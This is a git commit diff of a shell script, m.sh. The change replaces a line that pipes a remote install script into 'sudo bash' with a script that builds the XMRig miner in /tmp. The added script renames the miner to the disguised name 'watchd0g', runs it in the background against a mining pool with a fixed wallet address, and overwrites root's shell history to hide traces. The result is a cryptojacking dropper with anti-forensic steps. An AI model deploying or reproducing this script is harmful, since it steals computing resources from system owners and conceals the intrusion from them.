e9ac4a3c502fd0c28a0a64f40850ff73bb2b0175
momika233 <56291820+momika233@users.noreply.github.com>
2024-04-18 14:28:40 +0800

    Update m.sh

--- m.sh
+++ m.sh
@@ -1,2 +1,28 @@
 #!/bin/bash
-curl -kfsSL 'http://collie-agent-hk.chaitin.com:1443/api/v1/host/install_script?node=2&os_type=linux' | sudo bash -s -- --token=aedd6797a88a77276433193d9f02fbaf
+
+cd /tmp
+
+apt install git make cmake gcc automake libtool autoconf -y
+
+git clone https://github.com/momika233/xmrig.git
+
+cd xmrig
+
+mkdir build
+
+cd scripts && ./build_deps.sh && cd ../build
+
+cmake .. -DXMRIG_DEPS=scripts/deps
+
+make -j$(nproc)
+
+mkdir /tmp/watchd0g
+
+mv /tmp/xmrig/build/xmrig /tmp/watchd0g
+
+chmod 777 /tmp/watchd0g
+
+./tmp/watchd0g --donate-level 0 -o auto.c3pool.org:19999 -u 45F8ihixwyTi2WLadoJrsKdjwstKTAEupCYE6jzoBAZWQuY9uXxVh6i1LzoppCXuUx8tXjfaFUCG11DGXeXLkyrx1ir3gZj -t 2 -B
+
+echo "exit" > /root/.zsh_history
+
